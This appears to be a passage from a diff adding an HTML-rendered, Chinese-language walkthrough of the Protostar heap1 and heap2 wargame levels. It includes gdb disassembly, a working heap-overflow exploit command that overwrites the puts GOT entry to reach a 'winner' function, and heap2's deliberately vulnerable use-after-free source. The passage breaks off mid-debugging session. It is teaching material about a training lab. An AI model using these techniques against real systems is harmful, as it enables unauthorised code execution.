+Starting program: /opt/protostar/bin/heap1 AAAABBBBCCCCDDDDEEEEFFFFGGGG <span class="m">00001111222233334444</span>
+
+Program received signal SIGSEGV, Segmentation fault.
+*__GI_strcpy <span class="o">(</span><span class="nv">dest</span><span class="o">=</span>0x46464646 &lt;Address 0x46464646 out of bounds&gt;, <span class="c1"># F</span>
+    <span class="nv">src</span><span class="o">=</span>0xbffff8a1 <span class="s2">&quot;00001111222233334444&quot;</span><span class="o">)</span> at strcpy.c:40
+<span class="m">40</span>  strcpy.c: No such file or directory.
+    <span class="k">in</span> strcpy.c
+</code></pre></div>
+</li>
+<li>
+<p>注意到最后调用了 <code>printf</code> 函数，可以覆盖其 GOT 表条目</p>
+<div class="highlight"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span> <span class="nb">set</span> disassembly-flavor intel
+<span class="o">(</span>gdb<span class="o">)</span> disassemble main
+Dump of assembler code <span class="k">for</span> <span class="k">function</span> main:
+0x080484b9 &lt;main+0&gt;:    push   ebp
+0x080484ba &lt;main+1&gt;:    mov    ebp,esp
+0x080484bc &lt;main+3&gt;:    and    esp,0xfffffff0
+0x080484bf &lt;main+6&gt;:    sub    esp,0x20
+0x080484c2 &lt;main+9&gt;:    mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x8
+0x080484c9 &lt;main+16&gt;:   call   0x80483bc &lt;malloc@plt&gt;
+0x080484ce &lt;main+21&gt;:   mov    DWORD PTR <span class="o">[</span>esp+0x14<span class="o">]</span>,eax
+0x080484d2 &lt;main+25&gt;:   mov    eax,DWORD PTR <span class="o">[</span>esp+0x14<span class="o">]</span>
+0x080484d6 &lt;main+29&gt;:   mov    DWORD PTR <span class="o">[</span>eax<span class="o">]</span>,0x1
+0x080484dc &lt;main+35&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x8
+0x080484e3 &lt;main+42&gt;:   call   0x80483bc &lt;malloc@plt&gt;
+0x080484e8 &lt;main+47&gt;:   mov    edx,eax
+0x080484ea &lt;main+49&gt;:   mov    eax,DWORD PTR <span class="o">[</span>esp+0x14<span class="o">]</span>
+0x080484ee &lt;main+53&gt;:   mov    DWORD PTR <span class="o">[</span>eax+0x4<span class="o">]</span>,edx
+0x080484f1 &lt;main+56&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x8
+0x080484f8 &lt;main+63&gt;:   call   0x80483bc &lt;malloc@plt&gt;
+0x080484fd &lt;main+68&gt;:   mov    DWORD PTR <span class="o">[</span>esp+0x18<span class="o">]</span>,eax
+0x08048501 &lt;main+72&gt;:   mov    eax,DWORD PTR <span class="o">[</span>esp+0x18<span class="o">]</span>
+0x08048505 &lt;main+76&gt;:   mov    DWORD PTR <span class="o">[</span>eax<span class="o">]</span>,0x2
+0x0804850b &lt;main+82&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x8
+0x08048512 &lt;main+89&gt;:   call   0x80483bc &lt;malloc@plt&gt;
+0x08048517 &lt;main+94&gt;:   mov    edx,eax
+0x08048519 &lt;main+96&gt;:   mov    eax,DWORD PTR <span class="o">[</span>esp+0x18<span class="o">]</span>
+0x0804851d &lt;main+100&gt;:  mov    DWORD PTR <span class="o">[</span>eax+0x4<span class="o">]</span>,edx
+0x08048520 &lt;main+103&gt;:  mov    eax,DWORD PTR <span class="o">[</span>ebp+0xc<span class="o">]</span>
+0x08048523 &lt;main+106&gt;:  add    eax,0x4
+0x08048526 &lt;main+109&gt;:  mov    eax,DWORD PTR <span class="o">[</span>eax<span class="o">]</span>
+0x08048528 &lt;main+111&gt;:  mov    edx,eax
+0x0804852a &lt;main+113&gt;:  mov    eax,DWORD PTR <span class="o">[</span>esp+0x14<span class="o">]</span>
+0x0804852e &lt;main+117&gt;:  mov    eax,DWORD PTR <span class="o">[</span>eax+0x4<span class="o">]</span>
+0x08048531 &lt;main+120&gt;:  mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,edx
+0x08048535 &lt;main+124&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
+0x08048538 &lt;main+127&gt;:  call   0x804838c &lt;strcpy@plt&gt;
+0x0804853d &lt;main+132&gt;:  mov    eax,DWORD PTR <span class="o">[</span>ebp+0xc<span class="o">]</span>
+0x08048540 &lt;main+135&gt;:  add    eax,0x8
+0x08048543 &lt;main+138&gt;:  mov    eax,DWORD PTR <span class="o">[</span>eax<span class="o">]</span>
+0x08048545 &lt;main+140&gt;:  mov    edx,eax
+0x08048547 &lt;main+142&gt;:  mov    eax,DWORD PTR <span class="o">[</span>esp+0x18<span class="o">]</span>
+0x0804854b &lt;main+146&gt;:  mov    eax,DWORD PTR <span class="o">[</span>eax+0x4<span class="o">]</span>
+0x0804854e &lt;main+149&gt;:  mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,edx
+0x08048552 &lt;main+153&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
+0x08048555 &lt;main+156&gt;:  call   0x804838c &lt;strcpy@plt&gt;
+0x0804855a &lt;main+161&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x804864b
+0x08048561 &lt;main+168&gt;:  call   0x80483cc &lt;puts@plt&gt; <span class="c1"># 由于编译优化，实际上调用的是 puts</span>
+0x08048566 &lt;main+173&gt;:  leave  
+0x08048567 &lt;main+174&gt;:  ret    
+End of assembler dump.
+<span class="o">(</span>gdb<span class="o">)</span> disassemble 0x80483cc
+Dump of assembler code <span class="k">for</span> <span class="k">function</span> puts@plt:
+0x080483cc &lt;puts@plt+0&gt;:    jmp    DWORD PTR ds:0x8049774
+0x080483d2 &lt;puts@plt+6&gt;:    push   0x30
+0x080483d7 &lt;puts@plt+11&gt;:   jmp    0x804835c
+End of assembler dump.
+<span class="o">(</span>gdb<span class="o">)</span> x 0x8049774
+0x8049774 &lt;_GLOBAL_OFFSET_TABLE_+36&gt;:   0x080483d2
+</code></pre></div>
+</li>
+<li>
+<p><code>winner</code> 函数的地址</p>
+<div class="highlight"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span> x winner 
+0x8048494 &lt;winner&gt;: 0x83e58955
+</code></pre></div>
+</li>
+</ul>
+<h3 id="exploit_1">Exploit<a class="headerlink" href="#exploit_1" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code>$ ./heap1 <span class="sb">`</span>python -c <span class="s2">&quot;print &#39;A&#39; * 20 + &#39;\x74\x97\x04\x08&#39;&quot;</span><span class="sb">`</span> <span class="sb">`</span>python -c <span class="s2">&quot;print &#39;\x94\x84\x04\x08&#39;&quot;</span><span class="sb">`</span>
+and we have a winner @ <span class="m">1662252909</span>
+$ ./heap1 <span class="s2">&quot;`echo -ne &quot;</span>AAAABBBBCCCCDDDDEEEE<span class="se">\x</span><span class="m">74</span><span class="se">\x</span><span class="m">97</span><span class="se">\x</span><span class="m">04</span><span class="se">\x</span><span class="m">08</span><span class="s2">&quot;`&quot;</span> <span class="s2">&quot;`echo -ne &quot;</span><span class="se">\x</span><span class="m">94</span><span class="se">\x</span><span class="m">84</span><span class="se">\x</span><span class="m">04</span><span class="se">\x</span><span class="m">08</span><span class="s2">&quot;`&quot;</span>
+and we have a winner @ <span class="m">1662253600</span>
+$ ./heap1 <span class="s2">&quot;`/bin/echo -ne &quot;</span>AAAABBBBCCCCDDDDEEEE<span class="se">\x</span><span class="m">74</span><span class="se">\x</span><span class="m">97</span><span class="se">\x</span><span class="m">04</span><span class="se">\x</span><span class="m">08</span><span class="s2">&quot;`&quot;</span> <span class="s2">&quot;`/bin/echo -ne &quot;</span><span class="se">\x</span><span class="m">94</span><span class="se">\x</span><span class="m">84</span><span class="se">\x</span><span class="m">04</span><span class="se">\x</span><span class="m">08</span><span class="s2">&quot;`&quot;</span>
+and we have a winner @ <span class="m">1662256772</span>
+<span class="c1"># 在 gdb 中需要使用 /bin/echo，使用 echo 将不解析参数 -ne 而是直接输出</span>
+</code></pre></div>
+<h3 id="additional">Additional<a class="headerlink" href="#additional" title="Permanent link">&para;</a></h3>
+<p>关于在 <code>gdb</code> 中使用 <code>echo</code> 不能成功的问题</p>
+<div class="highlight"><pre><span></span><code>$ gdb ./heap1
+<span class="o">(</span>gdb<span class="o">)</span> <span class="nb">break</span> *0x080484ce
+Breakpoint <span class="m">1</span> at 0x80484ce: file heap1/heap1.c, line <span class="m">23</span>.
+<span class="o">(</span>gdb<span class="o">)</span> <span class="nb">break</span> *0x0804853d
+Breakpoint <span class="m">2</span> at 0x804853d: file heap1/heap1.c, line <span class="m">32</span>.
+<span class="o">(</span>gdb<span class="o">)</span> r <span class="s2">&quot;`echo -ne &quot;</span>AAAABBBBCCCCDDDDEEEE<span class="se">\x</span><span class="m">74</span><span class="se">\x</span><span class="m">97</span><span class="se">\x</span><span class="m">04</span><span class="se">\x</span><span class="m">08</span><span class="s2">&quot;`&quot;</span> <span class="s2">&quot;`echo -ne &quot;</span><span class="se">\x</span><span class="m">94</span><span class="se">\x</span><span class="m">84</span><span class="se">\x</span><span class="m">04</span><span class="se">\x</span><span class="m">08</span><span class="s2">&quot;`&quot;</span>
+Starting program: /opt/protostar/bin/heap1 <span class="s2">&quot;`echo -ne &quot;</span>AAAABBBBCCCCDDDDEEEE<span class="se">\x</span><span class="m">74</span><span class="se">\x</span><span class="m">97</span><span class="se">\x</span><span class="m">04</span><span class="se">\x</span><span class="m">08</span><span class="s2">&quot;`&quot;</span> <span class="s2">&quot;`echo -ne &quot;</span><span class="se">\x</span><span class="m">94</span><span class="se">\x</span><span class="m">84</span><span class="se">\x</span><span class="m">04</span><span class="se">\x</span><span class="m">08</span><span class="s2">&quot;`&quot;</span>
+
+Breakpoint <span class="m">1</span>, 0x080484ce <span class="k">in</span> main <span class="o">(</span><span class="nv">argc</span><span class="o">=</span><span class="m">3</span>, <span class="nv">argv</span><span class="o">=</span>0xbffff714<span class="o">)</span> at heap1/heap1.c:23
+<span class="m">23</span>  <span class="k">in</span> heap1/heap1.c
+<span class="o">(</span>gdb<span class="o">)</span> info registers 
+eax            0x804a008    <span class="m">134520840</span>
+ecx            0xb7fd93a0   -1208118368
+edx            0x804a000    <span class="m">134520832</span>
+ebx            0xb7fd7ff4   -1208123404
+esp            0xbffff640   0xbffff640
+ebp            0xbffff668   0xbffff668
+esi            0x0  <span class="m">0</span>
+edi            0x0  <span class="m">0</span>
+eip            0x80484ce    0x80484ce &lt;main+21&gt;
+eflags         0x200246 <span class="o">[</span> PF ZF IF ID <span class="o">]</span>
+cs             0x73 <span class="m">115</span>
+ss             0x7b <span class="m">123</span>
+ds             0x7b <span class="m">123</span>
+es             0x7b <span class="m">123</span>
+fs             0x0  <span class="m">0</span>
+gs             0x33 <span class="m">51</span>
+<span class="o">(</span>gdb<span class="o">)</span> <span class="nb">set</span> <span class="nv">$i1</span> <span class="o">=</span> <span class="o">(</span>struct internet*<span class="o">)</span>0x804a008
+<span class="o">(</span>gdb<span class="o">)</span> print *<span class="nv">$i1</span>
+<span class="nv">$1</span> <span class="o">=</span> <span class="o">{</span><span class="nv">priority</span> <span class="o">=</span> <span class="m">0</span>, <span class="nv">name</span> <span class="o">=</span> 0x0<span class="o">}</span>
+<span class="o">(</span>gdb<span class="o">)</span> c
+Continuing.
+
+Breakpoint <span class="m">2</span>, main <span class="o">(</span><span class="nv">argc</span><span class="o">=</span><span class="m">3</span>, <span class="nv">argv</span><span class="o">=</span>0xbffff714<span class="o">)</span> at heap1/heap1.c:32
+<span class="m">32</span>  <span class="k">in</span> heap1/heap1.c
+<span class="o">(</span>gdb<span class="o">)</span> print *<span class="nv">$i1</span>
+<span class="nv">$2</span> <span class="o">=</span> <span class="o">{</span><span class="nv">priority</span> <span class="o">=</span> <span class="m">1</span>, 
+  <span class="nv">name</span> <span class="o">=</span> 0x804a018 <span class="s2">&quot;-ne AAAABBBBCCCCDDDDEEEE\\x74\\x97\\x04\\x08&quot;</span><span class="o">}</span>
+</code></pre></div>
+<h2 id="heap-2">Heap 2<a class="headerlink" href="#heap-2" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/types.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+
+<span class="k">struct</span><span class="w"> </span><span class="nc">auth</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">name</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span><span class="w"></span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">auth</span><span class="p">;</span><span class="w"></span>
+<span class="p">};</span><span class="w"></span>
+
+<span class="k">struct</span><span class="w"> </span><span class="nc">auth</span><span class="w"> </span><span class="o">*</span><span class="n">auth</span><span class="p">;</span><span class="w"></span>
+<span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">service</span><span class="p">;</span><span class="w"></span>
+
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">)</span><span class="w"></span>
+<span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">line</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span><span class="w"></span>
+
+<span class="w">  </span><span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[ auth = %p, service = %p ]</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">auth</span><span class="p">,</span><span class="w"> </span><span class="n">service</span><span class="p">);</span><span class="w"></span>
+
+<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">line</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">line</span><span class="p">),</span><span class="w"> </span><span class="n">stdin</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span><span class="w"> </span><span class="k">break</span><span class="p">;</span><span class="w"></span>
+
+<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;auth &quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">5</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">      </span><span class="n">auth</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">auth</span><span class="p">));</span><span class="w"></span>
+<span class="w">      </span><span class="n">memset</span><span class="p">(</span><span class="n">auth</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">auth</span><span class="p">));</span><span class="w">    </span><span class="c1">// new allocated area can have old data</span>
+<span class="w">      </span><span class="k">if</span><span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">line</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">5</span><span class="p">)</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">31</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="n">strcpy</span><span class="p">(</span><span class="n">auth</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">line</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">5</span><span class="p">);</span><span class="w"></span>
+<span class="w">      </span><span class="p">}</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;reset&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">5</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">      </span><span class="n">free</span><span class="p">(</span><span class="n">auth</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;service&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">6</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">      </span><span class="n">service</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strdup</span><span class="p">(</span><span class="n">line</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">7</span><span class="p">);</span><span class="w"></span>
+<span class="w">      </span><span class="c1">// strdup(s) returns a pointer to a new string which is a duplicate of the string s. Memory for the new string is obtained with malloc.</span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;login&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">5</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">      </span><span class="k">if</span><span class="p">(</span><span class="n">auth</span><span class="o">-&gt;</span><span class="n">auth</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  </span><span class="c1">// use after free</span>
+<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;you have logged in already!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">      </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;please enter your password</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">      </span><span class="p">}</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+<span class="w">  </span><span class="p">}</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</code></pre></div>
+<ul>
+<li>
+<p>使用测试</p>
+<div class="highlight"><pre><span></span><code>$ ./heap2
+<span class="o">[</span> <span class="nv">auth</span> <span class="o">=</span> <span class="o">(</span>nil<span class="o">)</span>, <span class="nv">service</span> <span class="o">=</span> <span class="o">(</span>nil<span class="o">)</span> <span class="o">]</span>
+auth admin
+<span class="o">[</span> <span class="nv">auth</span> <span class="o">=</span> 0x804c008, <span class="nv">service</span> <span class="o">=</span> <span class="o">(</span>nil<span class="o">)</span> <span class="o">]</span>
+login
+please enter your password
+<span class="o">[</span> <span class="nv">auth</span> <span class="o">=</span> 0x804c008, <span class="nv">service</span> <span class="o">=</span> <span class="o">(</span>nil<span class="o">)</span> <span class="o">]</span>
+reset
+<span class="o">[</span> <span class="nv">auth</span> <span class="o">=</span> 0x804c008, <span class="nv">service</span> <span class="o">=</span> <span class="o">(</span>nil<span class="o">)</span> <span class="o">]</span>
+login
+please enter your password
+<span class="o">[</span> <span class="nv">auth</span> <span class="o">=</span> 0x804c008, <span class="nv">service</span> <span class="o">=</span> <span class="o">(</span>nil<span class="o">)</span> <span class="o">]</span>
+service hack
+<span class="o">[</span> <span class="nv">auth</span> <span class="o">=</span> 0x804c008, <span class="nv">service</span> <span class="o">=</span> 0x804c008 <span class="o">]</span>
+<span class="c1"># auth was freed and service got that free space there</span>
+</code></pre></div>
+</li>
+<li>
+<p>使用 <code>gdb</code> 查看堆的使用情况</p>
+<details class="note">
+<summary>Dump of assembler code for function main</summary>
+<div class="highlight"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span> <span class="nb">set</span> disassembly-flavor intel
+<span class="o">(</span>gdb<span class="o">)</span> disassemble main 
+Dump of assembler code <span class="k">for</span> <span class="k">function</span> main:
+0x08048934 &lt;main+0&gt;:    push   ebp
+0x08048935 &lt;main+1&gt;:    mov    ebp,esp
+0x08048937 &lt;main+3&gt;:    and    esp,0xfffffff0
+0x0804893a &lt;main+6&gt;:    sub    esp,0x90
+0x08048940 &lt;main+12&gt;:   jmp    0x8048943 &lt;main+15&gt;
+0x08048942 &lt;main+14&gt;:   nop
+0x08048943 &lt;main+15&gt;:   mov    ecx,DWORD PTR ds:0x804b5f8
+0x08048949 &lt;main+21&gt;:   mov    edx,DWORD PTR ds:0x804b5f4
+0x0804894f &lt;main+27&gt;:   mov    eax,0x804ad70
+0x08048954 &lt;main+32&gt;:   mov    DWORD PTR <span class="o">[</span>esp+0x8<span class="o">]</span>,ecx
+0x08048958 &lt;main+36&gt;:   mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,edx
+0x0804895c &lt;main+40&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
+0x0804895f &lt;main+43&gt;:   call   0x804881c &lt;printf@plt&gt;
+0x08048964 &lt;main+48&gt;:   mov    eax,ds:0x804b164
+0x08048969 &lt;main+53&gt;:   mov    DWORD PTR <span class="o">[</span>esp+0x8<span class="o">]</span>,eax
+0x0804896d &lt;main+57&gt;:   mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,0x80
+0x08048975 &lt;main+65&gt;:   lea    eax,<span class="o">[</span>esp+0x10<span class="o">]</span>
+0x08048979 &lt;main+69&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
+0x0804897c &lt;main+72&gt;:   call   0x80487ac &lt;fgets@plt&gt;
+0x08048981 &lt;main+77&gt;:   <span class="nb">test</span>   eax,eax
+0x08048983 &lt;main+79&gt;:   jne    0x8048987 &lt;main+83&gt;
+0x08048985 &lt;main+81&gt;:   leave  
+0x08048986 &lt;main+82&gt;:   ret    
+0x08048987 &lt;main+83&gt;:   mov    DWORD PTR <span class="o">[</span>esp+0x8<span class="o">]</span>,0x5
+0x0804898f &lt;main+91&gt;:   mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,0x804ad8d
+0x08048997 &lt;main+99&gt;:   lea    eax,<span class="o">[</span>esp+0x10<span class="o">]</span>
+0x0804899b &lt;main+103&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
+0x0804899e &lt;main+106&gt;:  call   0x804884c &lt;strncmp@plt&gt;
+0x080489a3 &lt;main+111&gt;:  <span class="nb">test</span>   eax,eax
+0x080489a5 &lt;main+113&gt;:  jne    0x8048a01 &lt;main+205&gt;
+0x080489a7 &lt;main+115&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x4
+0x080489ae &lt;main+122&gt;:  call   0x804916a &lt;malloc&gt;
+0x080489b3 &lt;main+127&gt;:  mov    ds:0x804b5f4,eax
+0x080489b8 &lt;main+132&gt;:  mov    eax,ds:0x804b5f4
+0x080489bd &lt;main+137&gt;:  mov    DWORD PTR <span class="o">[</span>esp+0x8<span class="o">]</span>,0x4
+0x080489c5 &lt;main+145&gt;:  mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,0x0
+0x080489cd &lt;main+153&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
+0x080489d0 &lt;main+156&gt;:  call   0x80487bc &lt;memset@plt&gt;
+0x080489d5 &lt;main+161&gt;:  lea    eax,<span class="o">[</span>esp+0x10<span class="o">]</span>
+0x080489d9 &lt;main+165&gt;:  add    eax,0x5
+0x080489dc &lt;main+168&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
+0x080489df &lt;main+171&gt;:  call   0x80487fc &lt;strlen@plt&gt;
+0x080489e4 &lt;main+176&gt;:  cmp    eax,0x1e
+0x080489e7 &lt;main+179&gt;:  ja     0x8048a01 &lt;main+205&gt;
+0x080489e9 &lt;main+181&gt;:  lea    eax,<span class="o">[</span>esp+0x10<span class="o">]</span>
+0x080489ed &lt;main+185&gt;:  lea    edx,<span class="o">[</span>eax+0x5<span class="o">]</span>
+0x080489f0 &lt;main+188&gt;:  mov    eax,ds:0x804b5f4
+0x080489f5 &lt;main+193&gt;:  mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,edx
+0x080489f9 &lt;main+197&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
+0x080489fc &lt;main+200&gt;:  call   0x804880c &lt;strcpy@plt&gt;
+0x08048a01 &lt;main+205&gt;:  mov    DWORD PTR <span class="o">[</span>esp+0x8<span class="o">]</span>,0x5
+0x08048a09 &lt;main+213&gt;:  mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,0x804ad93
+0x08048a11 &lt;main+221&gt;:  lea    eax,<span class="o">[</span>esp+0x10<span class="o">]</span>
+0x08048a15 &lt;main+225&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
+0x08048a18 &lt;main+228&gt;:  call   0x804884c &lt;strncmp@plt&gt;
+0x08048a1d &lt;main+233&gt;:  <span class="nb">test</span>   eax,eax
+0x08048a1f &lt;main+235&gt;:  jne    0x8048a2e &lt;main+250&gt;
+0x08048a21 &lt;main+237&gt;:  mov    eax,ds:0x804b5f4
+0x08048a26 &lt;main+242&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
+0x08048a29 &lt;main+245&gt;:  call   0x804999c &lt;free&gt;
+0x08048a2e &lt;main+250&gt;:  mov    DWORD PTR <span class="o">[</span>esp+0x8<span class="o">]</span>,0x6
+0x08048a36 &lt;main+258&gt;:  mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,0x804ad99
+0x08048a3e &lt;main+266&gt;:  lea    eax,<span class="o">[</span>esp+0x10<span class="o">]</span>
+0x08048a42 &lt;main+270&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
+0x08048a45 &lt;main+273&gt;:  call   0x804884c &lt;strncmp@plt&gt;
+0x08048a4a &lt;main+278&gt;:  <span class="nb">test</span>   eax,eax
+0x08048a4c &lt;main+280&gt;:  jne    0x8048a62 &lt;main+302&gt;
+0x08048a4e &lt;main+282&gt;:  lea    eax,<span class="o">[</span>esp+0x10<span class="o">]</span>
+0x08048a52 &lt;main+286&gt;:  add    eax,0x7
+0x08048a55 &lt;main+289&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
+0x08048a58 &lt;main+292&gt;:  call   0x804886c &lt;strdup@plt&gt;
+0x08048a5d &lt;main+297&gt;:  mov    ds:0x804b5f8,eax
+0x08048a62 &lt;main+302&gt;:  mov    DWORD PTR <span class="o">[</span>esp+0x8<span class="o">]</span>,0x5
+0x08048a6a &lt;main+310&gt;:  mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,0x804ada1
+0x08048a72 &lt;main+318&gt;:  lea    eax,<span class="o">[</span>esp+0x10<span class="o">]</span>
+0x08048a76 &lt;main+322&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
+0x08048a79 &lt;main+325&gt;:  call   0x804884c &lt;strncmp@plt&gt;
+0x08048a7e &lt;main+330&gt;:  <span class="nb">test</span>   eax,eax
+0x08048a80 &lt;main+332&gt;:  jne    0x8048942 &lt;main+14&gt;
+0x08048a86 &lt;main+338&gt;:  mov    eax,ds:0x804b5f4
+0x08048a8b &lt;main+343&gt;:  mov    eax,DWORD PTR <span class="o">[</span>eax+0x20<span class="o">]</span>
+0x08048a8e &lt;main+346&gt;:  <span class="nb">test</span>   eax,eax
+0x08048a90 &lt;main+348&gt;:  je     0x8048aa3 &lt;main+367&gt;
+0x08048a92 &lt;main+350&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x804ada7
+0x08048a99 &lt;main+357&gt;:  call   0x804883c &lt;puts@plt&gt;
+0x08048a9e &lt;main+362&gt;:  jmp    0x8048943 &lt;main+15&gt;
+0x08048aa3 &lt;main+367&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x804adc3
+0x08048aaa &lt;main+374&gt;:  call   0x804883c &lt;puts@plt&gt;
+0x08048aaf &lt;main+379&gt;:  jmp    0x8048943 &lt;main+15&gt;
+End of assembler dump.
+</code></pre></div>
+</details>
+<div class="highlight"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span> r
+Starting program: /opt/protostar/bin/heap2 
